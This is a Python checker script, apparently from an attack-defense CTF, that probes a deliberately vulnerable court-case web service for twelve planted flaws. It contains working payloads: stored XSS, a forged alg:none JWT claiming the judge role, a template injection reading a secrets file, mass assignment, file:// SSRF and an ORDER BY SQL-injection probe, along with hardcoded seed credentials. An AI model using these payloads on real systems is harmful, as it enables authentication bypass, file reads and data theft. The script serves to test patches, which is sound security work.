import base64
import json
import os
import re

import aiohttp

FRONT_PORT = 8081

_SCRIPT_SRC_RE = re.compile(r'<script[^>]+src="(/assets/[^"]+\.js)"', re.IGNORECASE)

# API endpoints
LOGIN_URL = "/api/auth/login"
CASES_URL = "/api/cases"
SEARCH_URL = "/api/cases/search"
ARCHIVE_URL = "/api/archive"
COMPLAINTS_URL = "/api/complaints"
DOCGEN_URL = "/api/documents/generate"

# Seed UUIDs (см. migrations/002_seed.sql) - нужны чтобы подделать alg:none
# токен с корректным user_id и role=judge.
JUDGE_UUID = "33333333-3333-4333-8333-333333333333"

DEFAULT_TIMEOUT = aiohttp.ClientTimeout(total=30)


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


async def _login(session, url, username, password):
    async with session.post(
        url + LOGIN_URL,
        json={"username": username, "password": password},
        timeout=DEFAULT_TIMEOUT,
    ) as r:
        if r.status != 200:
            return None
        try:
            data = await r.json(content_type=None)
        except Exception:
            return None
        return data.get("token")


async def _first_case_id(session, url, token):
    async with session.get(
        url + CASES_URL,
        headers={"Authorization": f"Bearer {token}"},
        timeout=DEFAULT_TIMEOUT,
    ) as r:
        if r.status != 200:
            return None
        data = await r.json(content_type=None)
        if isinstance(data, list) and data:
            return data[0].get("id")
        return None


async def _first_archive_id(session, url, token):
    async with session.get(
        url + ARCHIVE_URL,
        headers={"Authorization": f"Bearer {token}"},
        timeout=DEFAULT_TIMEOUT,
    ) as r:
        if r.status != 200:
            return None
        data = await r.json(content_type=None)
        if isinstance(data, list) and data:
            return data[0].get("id")
        return None


# ---------------------------------------------------------------------------
# Vuln 1 - Stored XSS в тексте доноса.
#   Raw: text сохраняется как есть; frontend рендерит через innerHTML.
#   Patched: bluemonday UGC-policy на create - <script> и on*-атрибуты удаляются.
# ---------------------------------------------------------------------------
async def vuln_1(url):
    async with aiohttp.ClientSession() as session:
        citizen_tok = await _login(session, url, "citizen_07", "c1t1z3n!")
        prosecutor_tok = await _login(session, url, "prosecutor_11", "pr0s3cut0r!")
        if not citizen_tok or not prosecutor_tok:
            print("[-] [Sploit-1]: login failed")
            return "no info"

        case_id = await _first_case_id(session, url, prosecutor_tok)
        if not case_id:
            return "no info"

        marker = "HAX1-" + os.urandom(4).hex()
        payload = f'<script>alert("{marker}")</script>clean-{marker}'

        async with session.post(
            url + COMPLAINTS_URL,
            json={"case_id": case_id, "text": payload},
            headers={"Authorization": f"Bearer {citizen_tok}"},
        ) as r:
            if r.status not in (200, 201):
                print(f"[-] [Sploit-1]: complaint create status {r.status}")
                return "no info"

        async with session.get(
            url + f"{COMPLAINTS_URL}/{case_id}",
            headers={"Authorization": f"Bearer {prosecutor_tok}"},
        ) as r:
            if r.status != 200:
                return "no info"
            listed = await r.json(content_type=None)

        for item in listed or []:
            text = item.get("text") or ""
            if marker not in text:
                continue
            if "<script" in text.lower():
                print(
                    "[+] [Sploit-1]: stored XSS - <script> persisted in complaint.text"
                )
                return "vulnerable"
            print("[+] [Sploit-1]: XSS sanitized - <script> stripped before storage")
            return "not vulnerable"

        print("[-] [Sploit-1]: inserted complaint not found")
        return "no info"


# ---------------------------------------------------------------------------
# Vuln 2 - JWT alg:none forgery.
#   Raw: pkg/jwt возвращает UnsafeAllowNoneSignatureType, любой токен с
#        alg:none принят -> можно подделать role=judge и вытащить
#        SECRET_MARKER_J из cases.classified_note.
#   Patched: jwt.Parse принимает только *SigningMethodHMAC -> 401.
# ---------------------------------------------------------------------------
async def vuln_2(url):
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(
        json.dumps({
            "user_id": JUDGE_UUID,
            "role": "judge",
            "dome": "Купол №7",
            "exp": 9999999999,
        }).encode()
    )
    forged = f"{header}.{payload}."

    async with aiohttp.ClientSession() as session:
        async with session.get(
            url + CASES_URL,
            headers={"Authorization": f"Bearer {forged}"},
        ) as r:
            if r.status == 401:
                print("[+] [Sploit-2]: alg:none rejected - JWT hardened")
                return "not vulnerable"
            if r.status != 200:
                print(f"[-] [Sploit-2]: unexpected status {r.status}")
                return "no info"
            try:
                data = await r.json(content_type=None)
            except Exception:
                return "no info"
            if not isinstance(data, list):
                return "no info"
            marker_found = any(
                "SECRET_MARKER_J" in (c.get("classified_note") or "") for c in data
            )
            if marker_found:
                print(
                    "[+] [Sploit-2]: forged alg:none accepted - SECRET_MARKER_J leaked"
                )
                return "vulnerable"
            # 200 без маркера - alg:none accepted, но classified_note скрыт
            # отдельным патчем Vuln 5; всё ещё signal что Vuln 2 не закрыт.
            print(
                "[+] [Sploit-2]: forged alg:none accepted (no marker - Vuln 5 patched?)"
            )
            return "vulnerable"


# ---------------------------------------------------------------------------
# Vuln 3 - Server-Side Template Injection + ReadClassified file read.
#   Raw: pkg/docgen.Generate парсит пользовательский template через
#        text/template и предоставляет метод .ReadClassified(path).
#   Patched: text/template заменён на strings.ReplaceAll по whitelist
#        плейсхолдеров {{case_id}}/{{defendant}}/{{verdict}}/{{details}}.
# ---------------------------------------------------------------------------
async def vuln_3(url):
    async with aiohttp.ClientSession() as session:
        prosecutor_tok = await _login(session, url, "prosecutor_11", "pr0s3cut0r!")
        if not prosecutor_tok:
            return "no info"

        case_id = await _first_case_id(session, url, prosecutor_tok)
        if not case_id:
            return "no info"

        # Смесь двух проб:
        #   1) {{.CaseID}} - классический text/template accessor. В raw
        #      интерполируется в UUID дела; в patched остаётся литералом
        #      (whitelist патча принимает только {{case_id}} без точки).
        #   2) {{.ReadClassified "secrets/classified.txt"}} - file read
        #      через метод контекста. Работает только в raw.
        tmpl = (
            "MARKER-BEGIN|{{.CaseID}}|"
            '{{.ReadClassified "secrets/classified.txt"}}|MARKER-END'
        )

        async with session.post(
            url + DOCGEN_URL,
            json={"case_id": case_id, "template": tmpl},
            headers={"Authorization": f"Bearer {prosecutor_tok}"},
        ) as r:
            if r.status == 500:
                # 500 говорит что template parser упал - это raw
                # сервис, без защиты.
                print("[+] [Sploit-3]: template parser errored - SSTI surface open")
                return "vulnerable"
            if r.status not in (200, 201):
                print(f"[-] [Sploit-3]: unexpected status {r.status}")
                return "no info"
            try:
                data = await r.json(content_type=None)
            except Exception:
                return "no info"
            body = data.get("content") or ""

        if "{{.CaseID}}" in body or "{{.ReadClassified" in body:
            print("[+] [Sploit-3]: templates not interpreted - SSTI patched")
            return "not vulnerable"
        if case_id in body:
            print("[+] [Sploit-3]: {{.CaseID}} interpolated - SSTI confirmed")
            return "vulnerable"
        if "SECRET_MARKER_T" in body:
            print(
                "[+] [Sploit-3]: ReadClassified leaked SECRET_MARKER_T - SSTI confirmed"
            )
            return "vulnerable"
        print("[-] [Sploit-3]: ambiguous response")
        return "no info"


# ---------------------------------------------------------------------------
# Vuln 4 - Mass Assignment на archive.classified_note через PATCH.
#   Raw: handler декодирует тело в map[string]any и SQLStore
#        .UpdateArchiveDynamic пропускает classified_note в SET-часть.
#   Patched: типизированный openapi.ArchivePatchRequest + whitelist в store
#        без classified_note - перезапись невозможна.
# ---------------------------------------------------------------------------
async def vuln_4(url):
    async with aiohttp.ClientSession() as session:
        judge_tok = await _login(session, url, "judge_3", "ju$tice_189")
        if not judge_tok:
            return "no info"

        archive_id = await _first_archive_id(session, url, judge_tok)
        if not archive_id:
            return "no info"

        async with session.get(
            url + f"{ARCHIVE_URL}/{archive_id}",
            headers={"Authorization": f"Bearer {judge_tok}"},
        ) as r:
            if r.status != 200:
                return "no info"
            before = (await r.json(content_type=None)) or {}

        original_note = before.get("classified_note")
        overwrite = "HAX4-" + os.urandom(4).hex()

        async with session.request(
            "PATCH",
            url + f"{ARCHIVE_URL}/{archive_id}",
            json={"classified_note": overwrite},
            headers={"Authorization": f"Bearer {judge_tok}"},
        ) as r:
            if r.status not in (200, 204):
                print(
                    f"[+] [Sploit-4]: PATCH rejected ({r.status}) - mass-assignment patched"
                )
                return "not vulnerable"

        async with session.get(
            url + f"{ARCHIVE_URL}/{archive_id}",
            headers={"Authorization": f"Bearer {judge_tok}"},
        ) as r:
            if r.status != 200:
                return "no info"
            after = (await r.json(content_type=None)) or {}

        if after.get("classified_note") == overwrite:
            print(
                "[+] [Sploit-4]: classified_note overwritten - Mass Assignment confirmed"
            )
            # На всякий случай - возвращаем оригинал, чтобы не ломать checker.
            if original_note is not None:
                try:
                    await session.request(
                        "PATCH",
                        url + f"{ARCHIVE_URL}/{archive_id}",
                        json={"classified_note": original_note},
                        headers={"Authorization": f"Bearer {judge_tok}"},
                    )
                except Exception:
                    pass
            return "vulnerable"
        print("[+] [Sploit-4]: classified_note unchanged - mass-assignment patched")
        return "not vulnerable"


# ---------------------------------------------------------------------------
# Vuln 5 - classified_note leak к non-judge через GET /api/cases.
#   Raw: response-конвертер всегда пробрасывает ClassifiedNote.
#   Patched: FromCase(..., role); всем кроме judge поле зануляется.
# ---------------------------------------------------------------------------
async def vuln_5(url):
    async with aiohttp.ClientSession() as session:
        prosecutor_tok = await _login(session, url, "prosecutor_11", "pr0s3cut0r!")
        if not prosecutor_tok:
            return "no info"

        async with session.get(
            url + CASES_URL,
            headers={"Authorization": f"Bearer {prosecutor_tok}"},
        ) as r:
            if r.status != 200:
                return "no info"
            data = await r.json(content_type=None)

        if not isinstance(data, list) or not data:
            return "no info"

        leaked = [c for c in data if c.get("classified_note")]
        if leaked:
            print(
                f"[+] [Sploit-5]: classified_note visible to prosecutor - "
                f"{len(leaked)}/{len(data)} leaked"
            )
            return "vulnerable"
        print("[+] [Sploit-5]: classified_note hidden for non-judge - patched")
        return "not vulnerable"


# ---------------------------------------------------------------------------
# Vuln 6 - SSRF через evidence URL.
#   Raw: transport.RegisterProtocol("file", NewFileTransport("/")).
#   Patched: file-transport удалён; url.Scheme whitelist (http/https) +
#        Control-хук диалера отбрасывает loopback/private/link-local IP.
# ---------------------------------------------------------------------------
async def vuln_6(url):
    async with aiohttp.ClientSession() as session:
        citizen_tok = await _login(session, url, "citizen_07", "c1t1z3n!")
        prosecutor_tok = await _login(session, url, "prosecutor_11", "pr0s3cut0r!")
        if not citizen_tok or not prosecutor_tok:
            return "no info"

        case_id = await _first_case_id(session, url, prosecutor_tok)
        if not case_id:
            return "no info"

        async with session.post(
            url + COMPLAINTS_URL,
            json={"case_id": case_id, "text": "ssrf carrier"},
            headers={"Authorization": f"Bearer {citizen_tok}"},
        ) as r:
            if r.status not in (200, 201):
                return "no info"
            complaint = await r.json(content_type=None)
        complaint_id = (complaint or {}).get("id")
        if not complaint_id:
            return "no info"

        # /etc/hostname доступен в любом linux-контейнере и маленький.
        async with session.post(
            url + f"{COMPLAINTS_URL}/{complaint_id}/evidence",
            json={"url": "file:///etc/hostname"},
            headers={"Authorization": f"Bearer {prosecutor_tok}"},
        ) as r:
            if r.status == 400:
                print("[+] [Sploit-6]: file:// rejected - SSRF patched")
                return "not vulnerable"
            if r.status != 200:
                print(f"[-] [Sploit-6]: unexpected status {r.status}")
                return "no info"
            data = await r.json(content_type=None)

        evidence = (data or {}).get("evidence_data") or ""
        if evidence.strip():
            print("[+] [Sploit-6]: file:// accepted - SSRF confirmed")
            return "vulnerable"
        print("[-] [Sploit-6]: file:// accepted but empty body - ambiguous")
        return "no info"


# ---------------------------------------------------------------------------
# Vuln 7 - SQL injection в ORDER BY через squirrel raw concat.
#   Raw: req.OrderBy конкатенируется сырым в SQL -> невалидный identifier
#        даёт sqlite error -> 500.
#   Patched: whitelist в usecase -> невалидное значение заменяется на
#        created_at DESC -> 200.
# ---------------------------------------------------------------------------
async def vuln_7(url):
    async with aiohttp.ClientSession() as session:
        prosecutor_tok = await _login(session, url, "prosecutor_11", "pr0s3cut0r!")
        if not prosecutor_tok:
            return "no info"

        async with session.post(
            url + SEARCH_URL,
            json={
                "q": "",
                "order_by": "nonexistent_col_sploit7",
                "direction": "asc",
                "limit": 5,
                "offset": 0,
            },
            headers={"Authorization": f"Bearer {prosecutor_tok}"},
        ) as r:
            status = r.status

        if status == 500:
            print("[+] [Sploit-7]: bad order_by reached SQL - SQLi surface open")
            return "vulnerable"
        if status == 200:
            print(
                "[+] [Sploit-7]: bad order_by falls back to whitelist default - patched"
            )
            return "not vulnerable"
        print(f"[-] [Sploit-7]: unexpected status {status}")
        return "no info"


# ---------------------------------------------------------------------------
# Frontend static probes (Vuln-8..Vuln-12).
# Для клиент-ориентированных уязвимостей (open redirect, postMessage,
# prototype pollution, XSS-render, bundle secrets) чекеру недоступен
# headless-браузер, поэтому анализируем исходники из /assets/*.js статически.
# ---------------------------------------------------------------------------
async def _fetch_bundle(session, front_url):
    """Скачать index.html и все /assets/*.js чанки. Возвращает (html, chunks)."""
    async with session.get(front_url + "/", timeout=DEFAULT_TIMEOUT) as r:
        if r.status != 200:
            return None, []
        html = await r.text()
    chunks = []
    for src in _SCRIPT_SRC_RE.findall(html):
        async with session.get(front_url + src, timeout=DEFAULT_TIMEOUT) as r:
            if r.status == 200:
                chunks.append((src, await r.text()))
    return html, chunks


# ---------------------------------------------------------------------------
# Vuln 8 - Secrets leak в бандле (F5).
#   Raw: vite inline-ит SECRET_MARKER_{B,K,P}_* через define: + VITE_* env.
#   Patched: define-блок удалён, DocgenPage.useEffect удалён, compose-args
#        без secret-переменных.
# ---------------------------------------------------------------------------
async def vuln_8(front_url):
    async with aiohttp.ClientSession() as session:
        _html, chunks = await _fetch_bundle(session, front_url)
        if not chunks:
            print("[-] [Sploit-8]: no chunks fetched")
            return "no info"
        markers = ("SECRET_MARKER_B_", "SECRET_MARKER_K_", "SECRET_MARKER_P_")
        for name, body in chunks:
            for m in markers:
                if m in body:
                    print(
                        f"[+] [Sploit-8]: {m} leaked in {name} - bundle secrets exposed"
                    )
                    return "vulnerable"
        print("[+] [Sploit-8]: no secret markers in bundle - patched")
        return "not vulnerable"


# ---------------------------------------------------------------------------
# Vuln 9 - Stored XSS render на стороне фронта (F1).
#   Raw: dangerouslySetInnerHTML: {__html: ...} без DOMPurify.sanitize
#        (CaseView.tsx + Toast.tsx).
#   Patched: все вызовы обёрнуты в DOMPurify.sanitize.
# ---------------------------------------------------------------------------
async def vuln_9(front_url):
    async with aiohttp.ClientSession() as session:
        _html, chunks = await _fetch_bundle(session, front_url)
        if not chunks:
            return "no info"
        # Ищем наличие маркера DOMPurify в бандле. Если DOMPurify
        # импортирован и используется - путь санитизации закрыт.
        combined = "\n".join(body for _, body in chunks)
        has_dangerous = "dangerouslySetInnerHTML" in combined
        has_purify = "DOMPurify" in combined or "dompurify" in combined.lower()
        if not has_dangerous:
            # Кто-то удалил dangerouslySetInnerHTML совсем - считаем safe.
            print("[+] [Sploit-9]: no dangerouslySetInnerHTML in bundle - patched")
            return "not vulnerable"
        if has_purify:
            print("[+] [Sploit-9]: DOMPurify present alongside dangerouslySetInnerHTML")
            return "not vulnerable"
        print(
            "[+] [Sploit-9]: dangerouslySetInnerHTML without DOMPurify - XSS render open"
        )
        return "vulnerable"


# ---------------------------------------------------------------------------
# Vuln 10 - Open Redirect через ?next= (F2).
#   Raw: LoginPage делает window.location.href = searchParams.get('next').
#   Patched: navigate() с whitelist-ом относительных путей без '//'.
# ---------------------------------------------------------------------------
async def vuln_10(front_url):
    async with aiohttp.ClientSession() as session:
        _html, chunks = await _fetch_bundle(session, front_url)
        if not chunks:
            return "no info"
        # Vite-минификатор схлопывает searchParams.get("next") в X.get("next").
        # Ищем в окне ±200 символов вокруг .get("next") присваивание
        # window.location.href - это надёжный sink-маркер.
        pat_next = re.compile(r'\.get\(\s*["\']next["\']\s*\)')
        pat_href = re.compile(r"window\.location\.href\s*=")
        for name, body in chunks:
            for m in pat_next.finditer(body):
                start = max(0, m.start() - 50)
                end = min(len(body), m.end() + 200)
                window = body[start:end]
                if pat_href.search(window):
                    print(
                        f"[+] [Sploit-10]: ?next= + location.href in {name} - open redirect"
                    )
                    return "vulnerable"
        print("[+] [Sploit-10]: no window.location.href sink for ?next= - patched")
        return "not vulnerable"


# ---------------------------------------------------------------------------
# Vuln 11 - Insecure postMessage (F3).
#   Raw: addEventListener("message", ...) без проверки event.origin /
#        event.source; внутри iframe target = '*'.
#   Patched: проверка ev.source (iframeRef.contentWindow / window.parent)
#        и target = window.location.origin.
# ---------------------------------------------------------------------------
async def vuln_11(front_url):
    async with aiohttp.ClientSession() as session:
        _html, chunks = await _fetch_bundle(session, front_url)
        if not chunks:
            return "no info"
        listener_pat = re.compile(r'addEventListener\(\s*["\']message["\']')
        for name, body in chunks:
            for m in listener_pat.finditer(body):
                # Контекст ±400 символов от addEventListener("message").
                start = max(0, m.start() - 50)
                end = min(len(body), m.end() + 400)
                window = body[start:end]
                if ".origin" in window or ".source" in window:
                    continue
                print(
                    f"[+] [Sploit-11]: message listener without origin/source check in {name}"
                )
                return "vulnerable"
        print("[+] [Sploit-11]: message listeners validate origin/source - patched")
        return "not vulnerable"


# ---------------------------------------------------------------------------
# Vuln 12 - Prototype Pollution в deepMerge (F4).
#   Raw: рекурсивный merge без guard - __proto__/constructor/prototype
#        попадают в target.
#   Patched: lodash.merge + sanitizeKeys удаляет опасные ключи.
# ---------------------------------------------------------------------------
async def vuln_12(front_url):
    async with aiohttp.ClientSession() as session:
        _html, chunks = await _fetch_bundle(session, front_url)
        if not chunks:
            return "no info"
        combined = "\n".join(body for _, body in chunks)
        # В patched-коде deepMerge инициализируется с новым Set-ом:
        #   new Set(['__proto__', 'prototype', 'constructor'])
        # Эта литеральная последовательность трёх имён подряд уникальна -
        # строки __proto__/constructor по отдельности встречаются в React/
        # других либах (false positive), но их тройка в порядке
        # proto -> prototype -> constructor - только в нашем guard-множестве.
        guard_pat = re.compile(
            r'["\']__proto__["\']\s*,\s*["\']prototype["\']\s*,\s*["\']constructor["\']'
        )
        if guard_pat.search(combined):
            print(
                "[+] [Sploit-12]: __proto__/prototype/constructor guard present - patched"
            )
            return "not vulnerable"
        print(
            "[+] [Sploit-12]: no __proto__/constructor guard - prototype pollution open"
        )
        return "vulnerable"


async def pwn(host, port):
    url = f"http://{host}:{port}"
    front_url = f"http://{host}:{FRONT_PORT}"
    fixed_vulns = 0

    probes = [
        ("Vuln-1", vuln_1, (url,)),
        ("Vuln-2", vuln_2, (url,)),
        ("Vuln-3", vuln_3, (url,)),
        ("Vuln-4", vuln_4, (url,)),
        ("Vuln-5", vuln_5, (url,)),
        ("Vuln-6", vuln_6, (url,)),
        ("Vuln-7", vuln_7, (url,)),
        ("Vuln-8", vuln_8, (front_url,)),
        ("Vuln-9", vuln_9, (front_url,)),
        ("Vuln-10", vuln_10, (front_url,)),
        ("Vuln-11", vuln_11, (front_url,)),
        ("Vuln-12", vuln_12, (front_url,)),
    ]
    for name, fn, args in probes:
        try:
            result = await fn(*args)
        except Exception as e:
            print(f"[!] [{name}]: probe error - {e}")
            continue
        if result == "not vulnerable":
            fixed_vulns += 1

    return fixed_vulns


# import asyncio
# print(asyncio.run(pwn("127.0.0.1", 8080)))
